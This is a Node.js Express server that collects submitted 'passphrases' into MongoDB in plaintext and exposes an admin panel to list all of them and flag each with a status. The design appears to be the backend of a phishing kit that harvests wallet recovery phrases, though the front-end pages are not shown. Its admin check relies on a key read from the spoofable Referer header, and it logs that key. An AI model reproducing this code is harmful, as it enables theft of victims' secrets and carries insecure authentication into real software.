require("dotenv").config(); // Load environment variables
const express = require("express");
const mongoose = require("mongoose");
const bodyParser = require("body-parser");
const cors = require("cors");
const path = require("path");
const Passphrase = require("./models/Passphrase");

const app = express();

// Middleware
app.use(cors());
app.use(bodyParser.json());
app.use(express.static("public")); // Serve static files from the public folder

// MongoDB Connection
mongoose
    .connect(process.env.MONGO_URI, { useNewUrlParser: true, useUnifiedTopology: true })
    .then(() => console.log("Connected to MongoDB"))
    .catch((error) => console.error("MongoDB connection error:", error));

// Authentication Middleware
const adminAuth = (req, res, next) => {
    const referer = req.get('referer'); // Get the referer header
    console.log("Received referer:", referer);

    if (!referer) return res.status(403).json({ message: "Forbidden: No referer" });

    const urlParams = new URLSearchParams(new URL(referer).search);
    const adminKeyFromReferer = urlParams.get('key');

    console.log("Extracted adminKey:", adminKeyFromReferer);

    if (adminKeyFromReferer === process.env.ADMIN_KEY) {
        return next();
    }

    console.warn("Unauthorized access attempt detected");
    return res.status(403).json({ message: "Forbidden: Unauthorized access" });
};

// Apply this middleware to admin routes
app.use('/admin', adminAuth);

// Routes
app.post("/save-passphrase", async (req, res) => {
    const { passphrase } = req.body;
    if (!passphrase) return res.status(400).json({ message: "Passphrase is required" });

    try {
        const newPassphrase = new Passphrase({ passphrase });
        await newPassphrase.save();
        res.status(200).json({ message: "Passphrase saved successfully" });
    } catch (error) {
        res.status(500).json({ message: "Failed to save passphrase", error });
    }
});

// Admin Route to View All Passphrases
app.get("/admin/passphrases", async (req, res) => {
    try {
        const passphrases = await Passphrase.find();
        res.status(200).json(passphrases);
    } catch (error) {
        res.status(500).json({ message: "Failed to fetch passphrases", error });
    }
});

// Admin Route to Update Status
app.patch("/admin/passphrases/:id", async (req, res) => {
    const { id } = req.params;
    const { status } = req.body;

    if (typeof status !== "number" || ![0, 1].includes(status)) {
        return res.status(400).json({ message: "Invalid status value" });
    }

    try {
        const updatedPassphrase = await Passphrase.findByIdAndUpdate(
            id, { status }, { new: true }
        );

        if (!updatedPassphrase) {
            return res.status(404).json({ message: "Passphrase not found" });
        }

        res.status(200).json({ message: "Status updated successfully", updatedPassphrase });
    } catch (error) {
        res.status(500).json({ message: "Failed to update status", error });
    }
});

// Serve Admin & Index Pages
app.get("/", (req, res) => {
    res.sendFile(path.join(__dirname, "public", "index.html"));
});

app.get("/admin", (req, res) => {
    res.sendFile(path.join(__dirname, "public", "admin.html"));
});

// Start server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server running on http://localhost:${PORT}`);
});
